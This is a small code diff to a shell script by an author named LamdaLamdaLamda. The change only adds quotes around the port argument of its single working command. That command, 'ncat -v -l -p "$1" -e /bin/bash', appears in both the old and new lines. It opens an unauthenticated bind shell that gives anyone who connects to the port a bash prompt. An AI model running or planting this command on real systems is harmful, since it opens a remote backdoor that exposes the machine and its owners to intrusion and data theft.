@@ -6,4 +6,4 @@
 #Author       : LamdaLamdaLamda
 #Email        : 25778959+LamdaLamdaLamda@users.noreply.github.com
 ###################################################################
-ncat -v -l -p $1 -e /bin/bash
+ncat -v -l -p "$1" -e /bin/bash
